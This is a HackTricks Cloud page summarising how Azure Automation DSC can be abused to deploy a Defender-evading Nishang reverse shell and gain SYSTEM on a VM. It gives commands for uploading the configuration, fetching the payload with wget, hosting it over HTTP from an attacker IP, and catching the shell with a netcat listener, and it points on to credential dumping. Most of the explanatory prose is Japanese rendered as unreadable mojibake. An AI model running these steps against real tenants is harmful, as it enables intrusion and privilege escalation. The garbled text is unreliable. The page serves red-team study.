# Az - State Configuration RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Summary of Remote Server (C2) Infrastructure Preparation and Steps

#### Overview

ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€Windows Defenderã‚’å›é¿ã™ã‚‹ã‚ˆã†ã«è¨­è¨ˆã•ã‚ŒãŸä¿®æ­£ã•ã‚ŒãŸNishang `Invoke-PowerShellTcp.ps1`ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã€`RevPS.ps1`ã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ãŸã‚ã®ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã‚¤ãƒ³ãƒ•ãƒ©ã‚¹ãƒˆãƒ©ã‚¯ãƒãƒ£ã®è¨­å®šã‚’å«ã¿ã¾ã™ã€‚ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€IP `40.84.7.74`ã®Kali Linuxãƒã‚·ãƒ³ã‹ã‚‰ã‚·ãƒ³ãƒ—ãƒ«ãªPython HTTPã‚µãƒ¼ãƒãƒ¼ã‚’ä½¿ç”¨ã—ã¦æä¾›ã•ã‚Œã¾ã™ã€‚ã“ã®æ“ä½œã¯ã€ã„ãã¤ã‹ã®ã‚¹ãƒ†ãƒƒãƒ—ã‚’é€šã˜ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

#### Step 1 â€” Create Files

* **Files Required:** å¿…è¦ãªPowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯2ã¤ã§ã™ï¼š
1. `reverse_shell_config.ps1`: ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å–å¾—ã—ã¦å®Ÿè¡Œã™ã‚‹Desired State Configuration (DSC)ãƒ•ã‚¡ã‚¤ãƒ«ã€‚ã“ã‚Œã¯[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)ã‹ã‚‰å…¥æ‰‹å¯èƒ½ã§ã™ã€‚
2. `push_reverse_shell_config.ps1`: VMã«æ§‹æˆã‚’å…¬é–‹ã™ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã€[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)ã§å…¥æ‰‹ã§ãã¾ã™ã€‚
* **Customization:** ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«å†…ã®å¤‰æ•°ã¨ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€ãƒªã‚½ãƒ¼ã‚¹åã€ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã€ã‚µãƒ¼ãƒãƒ¼/ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰è­˜åˆ¥å­ã‚’å«ã‚€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç‰¹å®šã®ç’°å¢ƒã«åˆã‚ã›ã¦èª¿æ•´ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

#### Step 2 â€” Zip Configuration File

* `reverse_shell_config.ps1`ã¯ã€Azure Storage Accountã«è»¢é€ã™ã‚‹æº–å‚™ãŒæ•´ã†ã‚ˆã†ã«`.zip`ãƒ•ã‚¡ã‚¤ãƒ«ã«åœ§ç¸®ã•ã‚Œã¾ã™ã€‚
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Step 3 â€” ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®è¨­å®šã¨ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰

* ZIPå½¢å¼ã®æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€Azureã®Set-AzStorageBlobContent cmdletã‚’ä½¿ç”¨ã—ã¦ã€äº‹å‰å®šç¾©ã•ã‚ŒãŸAzure Storageã‚³ãƒ³ãƒ†ãƒŠazure-pentestã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ã€‚
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Step 4 â€” Prep Kali Box

* Kaliã‚µãƒ¼ãƒãƒ¼ã¯ã€GitHubãƒªãƒã‚¸ãƒˆãƒªã‹ã‚‰RevPS.ps1ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®Windows VMã¨ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã®ãƒãƒ¼ãƒˆã‚’æŒ‡å®šã™ã‚‹ã‚ˆã†ã«ç·¨é›†ã•ã‚Œã¾ã™ã€‚

#### Step 5 â€” è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’å…¬é–‹ã™ã‚‹

* è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ãŒå®Ÿè¡Œã•ã‚Œã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒWindows VMã®æŒ‡å®šã•ã‚ŒãŸå ´æ‰€ã«ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã‚Œã¾ã™ã€‚

#### Step 6 â€” ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ›ã‚¹ãƒˆã—ã€ãƒªã‚¹ãƒŠãƒ¼ã‚’è¨­å®šã™ã‚‹

* ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«Pythonã®SimpleHTTPServerãŒèµ·å‹•ã•ã‚Œã€å—ä¿¡æ¥ç¶šã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ãŸã‚ã®Netcatãƒªã‚¹ãƒŠãƒ¼ãŒè¨­å®šã•ã‚Œã¾ã™ã€‚
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ãŒãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã€SYSTEMãƒ¬ãƒ™ãƒ«ã®ç‰¹æ¨©ã‚’é”æˆã—ã¾ã™ã€‚

#### çµè«–

ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã®æˆåŠŸã—ãŸå®Ÿè¡Œã¯ã€è³‡æ ¼æƒ…å ±ã®ãƒ€ãƒ³ãƒ—ã‚„æ”»æ’ƒã‚’è¤‡æ•°ã®VMã«æ‹¡å¤§ã™ã‚‹ãªã©ã€ã•ã‚‰ãªã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®å¯èƒ½æ€§ã‚’é–‹ãã¾ã™ã€‚ã“ã®ã‚¬ã‚¤ãƒ‰ã¯ã€Azure Automation DSCã®é ˜åŸŸã§ã®ç¶™ç¶šçš„ãªå­¦ç¿’ã¨å‰µé€ æ€§ã‚’å¥¨åŠ±ã—ã¦ã„ã¾ã™ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
